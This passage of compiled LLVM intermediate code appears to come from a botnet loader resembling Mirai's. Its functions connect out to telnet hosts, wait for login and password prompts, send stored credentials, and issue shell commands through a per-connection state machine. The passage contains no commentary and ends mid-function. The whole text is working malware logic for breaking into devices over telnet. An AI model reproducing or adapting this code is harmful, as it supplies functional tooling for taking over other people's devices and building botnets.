define dso_local void @server_queue_telnet(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  br label %5

5:                                                ; preds = %13, %2
  %6 = load %struct.server*, %struct.server** %3, align 8
  %7 = getelementptr inbounds %struct.server, %struct.server* %6, i32 0, i32 1
  %8 = atomicrmw add i32* %7, i32 0 seq_cst, align 4
  %9 = load %struct.server*, %struct.server** %3, align 8
  %10 = getelementptr inbounds %struct.server, %struct.server* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = icmp uge i32 %8, %11
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = call i32 (i32, ...) bitcast (i32 (...)* @sleep to i32 (i32, ...)*)(i32 1)
  br label %5, !llvm.loop !11

15:                                               ; preds = %5
  %16 = load %struct.server*, %struct.server** %3, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 1
  %18 = atomicrmw add i32* %17, i32 1 seq_cst, align 4
  %19 = load %struct.server*, %struct.server** %3, align 8
  %20 = icmp eq %struct.server* %19, null
  br i1 %20, label %21, label %23

21:                                               ; preds = %15
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %23

23:                                               ; preds = %21, %15
  %24 = load %struct.server*, %struct.server** %3, align 8
  %25 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  call void @server_telnet_probe(%struct.server* %24, %struct.telnet_info* %25)
  ret void
}

declare i32 @sleep(...) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @server_telnet_probe(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.connection*, align 8
  %8 = alloca %struct.epoll_event, align 1
  %9 = alloca i32, align 4
  %10 = alloca %struct.server_worker*, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  %12 = load %struct.server*, %struct.server** %3, align 8
  %13 = call i32 @util_socket_and_bind(%struct.server* %12)
  store i32 %13, i32* %5, align 4
  %14 = load %struct.server*, %struct.server** %3, align 8
  %15 = getelementptr inbounds %struct.server, %struct.server* %14, i32 0, i32 11
  %16 = load %struct.server_worker*, %struct.server_worker** %15, align 8
  %17 = load %struct.server*, %struct.server** %3, align 8
  %18 = getelementptr inbounds %struct.server, %struct.server* %17, i32 0, i32 18
  %19 = atomicrmw add i32* %18, i32 1 seq_cst, align 4
  %20 = load %struct.server*, %struct.server** %3, align 8
  %21 = getelementptr inbounds %struct.server, %struct.server* %20, i32 0, i32 16
  %22 = load i8, i8* %21, align 2
  %23 = zext i8 %22 to i32
  %24 = srem i32 %19, %23
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %16, i64 %25
  store %struct.server_worker* %26, %struct.server_worker** %10, align 8
  %27 = load i32, i32* %5, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %38

29:                                               ; preds = %2
  %30 = call i64 @time(i64* null) #8
  %31 = srem i64 %30, 10
  %32 = icmp eq i64 %31, 0
  br i1 %32, label %33, label %34

33:                                               ; preds = %29
  br label %34

34:                                               ; preds = %33, %29
  %35 = load %struct.server*, %struct.server** %3, align 8
  %36 = getelementptr inbounds %struct.server, %struct.server* %35, i32 0, i32 1
  %37 = atomicrmw sub i32* %36, i32 1 seq_cst, align 4
  br label %111

38:                                               ; preds = %2
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = load %struct.server*, %struct.server** %3, align 8
  %42 = getelementptr inbounds %struct.server, %struct.server* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 8
  %44 = mul i32 %43, 2
  %45 = icmp uge i32 %40, %44
  br i1 %45, label %46, label %52

46:                                               ; preds = %39
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  %48 = load i32, i32* %5, align 4
  %49 = load %struct.connection*, %struct.connection** %7, align 8
  %50 = getelementptr inbounds %struct.connection, %struct.connection* %49, i32 0, i32 4
  store i32 %48, i32* %50, align 8
  %51 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_close(%struct.connection* %51)
  br label %111

52:                                               ; preds = %39
  %53 = load %struct.server*, %struct.server** %3, align 8
  %54 = icmp eq %struct.server* %53, null
  br i1 %54, label %55, label %57

55:                                               ; preds = %52
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  br label %57

57:                                               ; preds = %55, %52
  %58 = load %struct.server*, %struct.server** %3, align 8
  %59 = getelementptr inbounds %struct.server, %struct.server* %58, i32 0, i32 12
  %60 = load %struct.connection**, %struct.connection*** %59, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.connection*, %struct.connection** %60, i64 %62
  %64 = load %struct.connection*, %struct.connection** %63, align 8
  store %struct.connection* %64, %struct.connection** %7, align 8
  %65 = load %struct.connection*, %struct.connection** %7, align 8
  %66 = getelementptr inbounds %struct.connection, %struct.connection* %65, i32 0, i32 3
  %67 = bitcast %struct.telnet_info* %66 to i8*
  %68 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %69 = bitcast %struct.telnet_info* %68 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 8 %67, i8* align 4 %69, i64 120, i1 false)
  %70 = load %struct.server*, %struct.server** %3, align 8
  %71 = load %struct.connection*, %struct.connection** %7, align 8
  %72 = getelementptr inbounds %struct.connection, %struct.connection* %71, i32 0, i32 1
  store %struct.server* %70, %struct.server** %72, align 8
  %73 = load i32, i32* %5, align 4
  %74 = load %struct.connection*, %struct.connection** %7, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 4
  store i32 %73, i32* %75, align 8
  %76 = load %struct.connection*, %struct.connection** %7, align 8
  call void @connection_open(%struct.connection* %76)
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %77, align 4
  %78 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %79 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %78, i32 0, i32 4
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %81, i32 0, i32 0
  store i32 %80, i32* %82, align 4
  %83 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 5
  %85 = load i16, i16* %84, align 4
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %85, i16* %86, align 2
  %87 = load i32, i32* %5, align 4
  %88 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %89 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %89, %struct.sockaddr** %88, align 8
  %90 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %91 = load %struct.sockaddr*, %struct.sockaddr** %90, align 8
  %92 = call i32 @connect(i32 %87, %struct.sockaddr* %91, i32 16)
  store i32 %92, i32* %9, align 4
  %93 = load i32, i32* %9, align 4
  %94 = icmp eq i32 %93, -1
  br i1 %94, label %95, label %101

95:                                               ; preds = %57
  %96 = call i32* @__errno_location() #10
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 115
  br i1 %98, label %99, label %101

99:                                               ; preds = %95
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  br label %101

101:                                              ; preds = %99, %95, %57
  %102 = load i32, i32* %5, align 4
  %103 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %104 = bitcast %union.epoll_data* %103 to i32*
  store i32 %102, i32* %104, align 1
  %105 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 4, i32* %105, align 1
  %106 = load %struct.server_worker*, %struct.server_worker** %10, align 8
  %107 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %106, i32 0, i32 1
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %5, align 4
  %110 = call i32 @epoll_ctl(i32 %108, i32 1, i32 %109, %struct.epoll_event* %8) #8
  br label %111

111:                                              ; preds = %101, %46, %34
  ret void
}

declare i32 @util_socket_and_bind(%struct.server*) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare void @connection_close(%struct.connection*) #2

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #5

declare void @connection_open(%struct.connection*) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @bind_core(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca %struct.cpu_set_t, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %7 = call i64 @pthread_self() #10
  store i64 %7, i64* %3, align 8
  br label %8

8:                                                ; preds = %1
  %9 = bitcast %struct.cpu_set_t* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %9, i8 0, i64 128, i1 false)
  br label %10

10:                                               ; preds = %8
  %11 = load i32, i32* %2, align 4
  %12 = sext i32 %11 to i64
  store i64 %12, i64* %5, align 8
  %13 = load i64, i64* %5, align 8
  %14 = udiv i64 %13, 8
  %15 = icmp ult i64 %14, 128
  br i1 %15, label %16, label %27

16:                                               ; preds = %10
  %17 = load i64, i64* %5, align 8
  %18 = urem i64 %17, 64
  %19 = shl i64 1, %18
  %20 = getelementptr inbounds %struct.cpu_set_t, %struct.cpu_set_t* %4, i32 0, i32 0
  %21 = getelementptr inbounds [16 x i64], [16 x i64]* %20, i64 0, i64 0
  %22 = load i64, i64* %5, align 8
  %23 = udiv i64 %22, 64
  %24 = getelementptr inbounds i64, i64* %21, i64 %23
  %25 = load i64, i64* %24, align 8
  %26 = or i64 %25, %19
  store i64 %26, i64* %24, align 8
  br label %28

27:                                               ; preds = %10
  br label %28

28:                                               ; preds = %27, %16
  %29 = phi i64 [ %26, %16 ], [ 0, %27 ]
  store i64 %29, i64* %6, align 8
  %30 = load i64, i64* %6, align 8
  %31 = load i64, i64* %3, align 8
  %32 = call i32 @pthread_setaffinity_np(i64 %31, i64 128, %struct.cpu_set_t* %4) #8
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %37

34:                                               ; preds = %28
  %35 = load i32, i32* %2, align 4
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.8, i64 0, i64 0), i32 %35)
  br label %37

37:                                               ; preds = %34, %28
  ret void
}

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #2

declare void @perror(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @handle_event(%struct.server_worker* %0, %struct.epoll_event* %1) #0 {
  %3 = alloca %struct.server_worker*, align 8
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca %struct.connection*, align 8
  %6 = alloca %struct.epoll_event, align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.binary*, align 8
  %12 = alloca i32, align 4
  store %struct.server_worker* %0, %struct.server_worker** %3, align 8
  store %struct.epoll_event* %1, %struct.epoll_event** %4, align 8
  %13 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %14 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %13, i32 0, i32 0
  %15 = load %struct.server*, %struct.server** %14, align 8
  %16 = getelementptr inbounds %struct.server, %struct.server* %15, i32 0, i32 12
  %17 = load %struct.connection**, %struct.connection*** %16, align 8
  %18 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %19 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %18, i32 0, i32 1
  %20 = bitcast %union.epoll_data* %19 to i32*
  %21 = load i32, i32* %20, align 1
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.connection*, %struct.connection** %17, i64 %22
  %24 = load %struct.connection*, %struct.connection** %23, align 8
  store %struct.connection* %24, %struct.connection** %5, align 8
  %25 = load %struct.connection*, %struct.connection** %5, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 4
  %27 = load i32, i32* %26, align 8
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %37

29:                                               ; preds = %2
  %30 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %31 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %30, i32 0, i32 1
  %32 = bitcast %union.epoll_data* %31 to i32*
  %33 = load i32, i32* %32, align 1
  %34 = load %struct.connection*, %struct.connection** %5, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 4
  store i32 %33, i32* %35, align 8
  %36 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %36)
  br label %741

37:                                               ; preds = %2
  %38 = load %struct.connection*, %struct.connection** %5, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 4
  %40 = load i32, i32* %39, align 8
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i32 0, i32 1
  %43 = bitcast %union.epoll_data* %42 to i32*
  %44 = load i32, i32* %43, align 1
  %45 = icmp ne i32 %40, %44
  br i1 %45, label %46, label %48

46:                                               ; preds = %37
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0))
  br label %48

48:                                               ; preds = %46, %37
  %49 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %50 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 1
  %52 = and i32 %51, 8
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %66, label %54

54:                                               ; preds = %48
  %55 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %56 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 1
  %58 = and i32 %57, 16
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %66, label %60

60:                                               ; preds = %54
  %61 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i32 0, i32 0
  %63 = load i32, i32* %62, align 1
  %64 = and i32 %63, 8192
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %68

66:                                               ; preds = %60, %54, %48
  %67 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %67)
  br label %741

68:                                               ; preds = %60
  %69 = load %struct.connection*, %struct.connection** %5, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 7
  %71 = load i32, i32* %70, align 8
  %72 = icmp eq i32 %71, 1
  br i1 %72, label %73, label %107

73:                                               ; preds = %68
  %74 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 1
  %77 = and i32 %76, 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %107

79:                                               ; preds = %73
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %80 = load %struct.connection*, %struct.connection** %5, align 8
  %81 = getelementptr inbounds %struct.connection, %struct.connection* %80, i32 0, i32 4
  %82 = load i32, i32* %81, align 8
  %83 = bitcast i32* %7 to i8*
  %84 = call i32 @getsockopt(i32 %82, i32 1, i32 4, i8* %83, i32* %8) #8
  %85 = load i32, i32* %7, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %79
  %88 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %88)
  br label %741

89:                                               ; preds = %79
  %90 = load %struct.connection*, %struct.connection** %5, align 8
  %91 = getelementptr inbounds %struct.connection, %struct.connection* %90, i32 0, i32 4
  %92 = load i32, i32* %91, align 8
  %93 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %6, i32 0, i32 1
  %94 = bitcast %union.epoll_data* %93 to i32*
  store i32 %92, i32* %94, align 1
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %6, i32 0, i32 0
  store i32 -2147483647, i32* %95, align 1
  %96 = load %struct.server_worker*, %struct.server_worker** %3, align 8
  %97 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %96, i32 0, i32 1
  %98 = load i32, i32* %97, align 8
  %99 = load %struct.connection*, %struct.connection** %5, align 8
  %100 = getelementptr inbounds %struct.connection, %struct.connection* %99, i32 0, i32 4
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @epoll_ctl(i32 %98, i32 3, i32 %101, %struct.epoll_event* %6) #8
  %103 = load %struct.connection*, %struct.connection** %5, align 8
  %104 = getelementptr inbounds %struct.connection, %struct.connection* %103, i32 0, i32 7
  store i32 2, i32* %104, align 8
  %105 = load %struct.connection*, %struct.connection** %5, align 8
  %106 = getelementptr inbounds %struct.connection, %struct.connection* %105, i32 0, i32 10
  store i16 30, i16* %106, align 2
  br label %107

107:                                              ; preds = %89, %73, %68
  %108 = load %struct.connection*, %struct.connection** %5, align 8
  %109 = getelementptr inbounds %struct.connection, %struct.connection* %108, i32 0, i32 11
  %110 = load i8, i8* %109, align 4
  %111 = icmp ne i8 %110, 0
  br i1 %111, label %127, label %112

112:                                              ; preds = %107
  %113 = load %struct.connection*, %struct.connection** %5, align 8
  %114 = getelementptr inbounds %struct.connection, %struct.connection* %113, i32 0, i32 4
  %115 = load i32, i32* %114, align 8
  %116 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %117 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %116, i32 0, i32 1
  %118 = bitcast %union.epoll_data* %117 to i32*
  %119 = load i32, i32* %118, align 1
  %120 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %121 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %120, i32 0, i32 0
  %122 = load i32, i32* %121, align 1
  %123 = load %struct.connection*, %struct.connection** %5, align 8
  %124 = getelementptr inbounds %struct.connection, %struct.connection* %123, i32 0, i32 7
  %125 = load i32, i32* %124, align 8
  %126 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.10, i64 0, i64 0), i32 %115, i32 %119, i32 %122, i32 %125)
  br label %127

127:                                              ; preds = %112, %107
  %128 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %129 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %128, i32 0, i32 0
  %130 = load i32, i32* %129, align 1
  %131 = and i32 %130, 1
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %133, label %741

133:                                              ; preds = %127
  %134 = load %struct.connection*, %struct.connection** %5, align 8
  %135 = getelementptr inbounds %struct.connection, %struct.connection* %134, i32 0, i32 11
  %136 = load i8, i8* %135, align 4
  %137 = sext i8 %136 to i32
  %138 = icmp ne i32 %137, 0
  br i1 %138, label %139, label %741

139:                                              ; preds = %133
  %140 = call i64 @time(i64* null) #8
  %141 = load %struct.connection*, %struct.connection** %5, align 8
  %142 = getelementptr inbounds %struct.connection, %struct.connection* %141, i32 0, i32 6
  store i64 %140, i64* %142, align 8
  br label %143

143:                                              ; preds = %139, %739
  %144 = load %struct.connection*, %struct.connection** %5, align 8
  %145 = getelementptr inbounds %struct.connection, %struct.connection* %144, i32 0, i32 4
  %146 = load i32, i32* %145, align 8
  %147 = load %struct.connection*, %struct.connection** %5, align 8
  %148 = getelementptr inbounds %struct.connection, %struct.connection* %147, i32 0, i32 15
  %149 = getelementptr inbounds [8192 x i8], [8192 x i8]* %148, i64 0, i64 0
  %150 = load %struct.connection*, %struct.connection** %5, align 8
  %151 = getelementptr inbounds %struct.connection, %struct.connection* %150, i32 0, i32 9
  %152 = load i16, i16* %151, align 8
  %153 = zext i16 %152 to i32
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %149, i64 %154
  %156 = load %struct.connection*, %struct.connection** %5, align 8
  %157 = getelementptr inbounds %struct.connection, %struct.connection* %156, i32 0, i32 9
  %158 = load i16, i16* %157, align 8
  %159 = zext i16 %158 to i64
  %160 = sub i64 8192, %159
  %161 = call i64 @recv(i32 %146, i8* %155, i64 %160, i32 16384)
  %162 = trunc i64 %161 to i32
  store i32 %162, i32* %9, align 4
  %163 = load i32, i32* %9, align 4
  %164 = icmp sle i32 %163, 0
  br i1 %164, label %165, label %176

165:                                              ; preds = %143
  %166 = call i32* @__errno_location() #10
  %167 = load i32, i32* %166, align 4
  %168 = icmp ne i32 %167, 11
  br i1 %168, label %169, label %175

169:                                              ; preds = %165
  %170 = call i32* @__errno_location() #10
  %171 = load i32, i32* %170, align 4
  %172 = icmp ne i32 %171, 11
  br i1 %172, label %173, label %175

173:                                              ; preds = %169
  %174 = load %struct.connection*, %struct.connection** %5, align 8
  call void @connection_close(%struct.connection* %174)
  br label %175

175:                                              ; preds = %173, %169, %165
  br label %740

176:                                              ; preds = %143
  %177 = load i32, i32* %9, align 4
  %178 = load %struct.connection*, %struct.connection** %5, align 8
  %179 = getelementptr inbounds %struct.connection, %struct.connection* %178, i32 0, i32 9
  %180 = load i16, i16* %179, align 8
  %181 = zext i16 %180 to i32
  %182 = add nsw i32 %181, %177
  %183 = trunc i32 %182 to i16
  store i16 %183, i16* %179, align 8
  %184 = call i64 @time(i64* null) #8
  %185 = load %struct.connection*, %struct.connection** %5, align 8
  %186 = getelementptr inbounds %struct.connection, %struct.connection* %185, i32 0, i32 6
  store i64 %184, i64* %186, align 8
  %187 = load %struct.connection*, %struct.connection** %5, align 8
  %188 = getelementptr inbounds %struct.connection, %struct.connection* %187, i32 0, i32 9
  %189 = load i16, i16* %188, align 8
  %190 = zext i16 %189 to i32
  %191 = icmp sgt i32 %190, 8196
  br i1 %191, label %192, label %194

192:                                              ; preds = %176
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.11, i64 0, i64 0))
  call void @abort() #9
  unreachable

194:                                              ; preds = %176
  br label %195

195:                                              ; preds = %194, %738
  %196 = load %struct.connection*, %struct.connection** %5, align 8
  %197 = getelementptr inbounds %struct.connection, %struct.connection* %196, i32 0, i32 7
  %198 = load i32, i32* %197, align 8
  switch i32 %198, label %685 [
    i32 2, label %199
    i32 3, label %208
    i32 4, label %236
    i32 5, label %264
    i32 6, label %284
    i32 7, label %296
    i32 8, label %314
    i32 9, label %326
    i32 10, label %335
    i32 11, label %362
    i32 12, label %397
    i32 13, label %439
    i32 14, label %464
    i32 15, label %527
    i32 16, label %548
    i32 17, label %569
    i32 18, label %608
    i32 19, label %675
  ]

199:                                              ; preds = %195
  %200 = load %struct.connection*, %struct.connection** %5, align 8
  %201 = call i32 @connection_consume_iacs(%struct.connection* %200)
  store i32 %201, i32* %10, align 4
  %202 = load i32, i32* %10, align 4
  %203 = icmp ne i32 %202, 0
  br i1 %203, label %204, label %207

204:                                              ; preds = %199
  %205 = load %struct.connection*, %struct.connection** %5, align 8
  %206 = getelementptr inbounds %struct.connection, %struct.connection* %205, i32 0, i32 7
  store i32 3, i32* %206, align 8
  br label %207

207:                                              ; preds = %204, %199
  br label %686

208:                                              ; preds = %195
  %209 = load %struct.connection*, %struct.connection** %5, align 8
  %210 = call i32 @connection_consume_login_prompt(%struct.connection* %209)
  store i32 %210, i32* %10, align 4
  %211 = load i32, i32* %10, align 4
  %212 = icmp ne i32 %211, 0
  br i1 %212, label %213, label %235

213:                                              ; preds = %208
  %214 = load %struct.connection*, %struct.connection** %5, align 8
  %215 = getelementptr inbounds %struct.connection, %struct.connection* %214, i32 0, i32 4
  %216 = load i32, i32* %215, align 8
  %217 = load %struct.connection*, %struct.connection** %5, align 8
  %218 = getelementptr inbounds %struct.connection, %struct.connection* %217, i32 0, i32 3
  %219 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %218, i32 0, i32 0
  %220 = getelementptr inbounds [32 x i8], [32 x i8]* %219, i64 0, i64 0
  %221 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %216, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %220)
  %222 = load %struct.connection*, %struct.connection** %5, align 8
  %223 = getelementptr inbounds %struct.connection, %struct.connection* %222, i32 0, i32 8
  %224 = getelementptr inbounds %struct.anon, %struct.anon* %223, i32 0, i32 0
  %225 = getelementptr inbounds [512 x i8], [512 x i8]* %224, i64 0, i64 0
  %226 = call i8* @strcpy(i8* %225, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0)) #8
  %227 = call i64 @time(i64* null) #8
  %228 = add nsw i64 %227, 1
  %229 = trunc i64 %228 to i32
  %230 = load %struct.connection*, %struct.connection** %5, align 8
  %231 = getelementptr inbounds %struct.connection, %struct.connection* %230, i32 0, i32 8
  %232 = getelementptr inbounds %struct.anon, %struct.anon* %231, i32 0, i32 1
  store i32 %229, i32* %232, align 4
  %233 = load %struct.connection*, %struct.connection** %5, align 8
  %234 = getelementptr inbounds %struct.connection, %struct.connection* %233, i32 0, i32 7
  store i32 4, i32* %234, align 8
  br label %235

235:                                              ; preds = %213, %208
  br label %686

236:                                              ; preds = %195
  %237 = load %struct.connection*, %struct.connection** %5, align 8
  %238 = call i32 @connection_consume_password_prompt(%struct.connection* %237)
  store i32 %238, i32* %10, align 4
  %239 = load i32, i32* %10, align 4
  %240 = icmp ne i32 %239, 0
  br i1 %240, label %241, label %263

241:                                              ; preds = %236
  %242 = load %struct.connection*, %struct.connection** %5, align 8
  %243 = getelementptr inbounds %struct.connection, %struct.connection* %242, i32 0, i32 4
  %244 = load i32, i32* %243, align 8
  %245 = load %struct.connection*, %struct.connection** %5, align 8
  %246 = getelementptr inbounds %struct.connection, %struct.connection* %245, i32 0, i32 3
  %247 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %246, i32 0, i32 1
  %248 = getelementptr inbounds [32 x i8], [32 x i8]* %247, i64 0, i64 0
  %249 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %244, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* %248)
  %250 = load %struct.connection*, %struct.connection** %5, align 8
  %251 = getelementptr inbounds %struct.connection, %struct.connection* %250, i32 0, i32 8
  %252 = getelementptr inbounds %struct.anon, %struct.anon* %251, i32 0, i32 0
  %253 = getelementptr inbounds [512 x i8], [512 x i8]* %252, i64 0, i64 0
  %254 = call i8* @strcpy(i8* %253, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i64 0, i64 0)) #8
  %255 = call i64 @time(i64* null) #8
  %256 = add nsw i64 %255, 1
  %257 = trunc i64 %256 to i32
  %258 = load %struct.connection*, %struct.connection** %5, align 8
  %259 = getelementptr inbounds %struct.connection, %struct.connection* %258, i32 0, i32 8
  %260 = getelementptr inbounds %struct.anon, %struct.anon* %259, i32 0, i32 1
  store i32 %257, i32* %260, align 4
  %261 = load %struct.connection*, %struct.connection** %5, align 8
  %262 = getelementptr inbounds %struct.connection, %struct.connection* %261, i32 0, i32 7
  store i32 5, i32* %262, align 8
  br label %263

263:                                              ; preds = %241, %236
  br label %686

264:                                              ; preds = %195
  %265 = load %struct.connection*, %struct.connection** %5, align 8
  %266 = call i32 @connection_consume_prompt(%struct.connection* %265)
  store i32 %266, i32* %10, align 4
  %267 = icmp sgt i32 %266, 0
  br i1 %267, label %268, label %283

268:                                              ; preds = %264
  %269 = load %struct.connection*, %struct.connection** %5, align 8
  %270 = getelementptr inbounds %struct.connection, %struct.connection* %269, i32 0, i32 4
  %271 = load i32, i32* %270, align 8
  %272 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %271, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.14, i64 0, i64 0))
  %273 = load %struct.connection*, %struct.connection** %5, align 8
  %274 = getelementptr inbounds %struct.connection, %struct.connection* %273, i32 0, i32 4
  %275 = load i32, i32* %274, align 8
  %276 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %275, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.15, i64 0, i64 0))
  %277 = load %struct.connection*, %struct.connection** %5, align 8
  %278 = getelementptr inbounds %struct.connection, %struct.connection* %277, i32 0, i32 4
  %279 = load i32, i32* %278, align 8
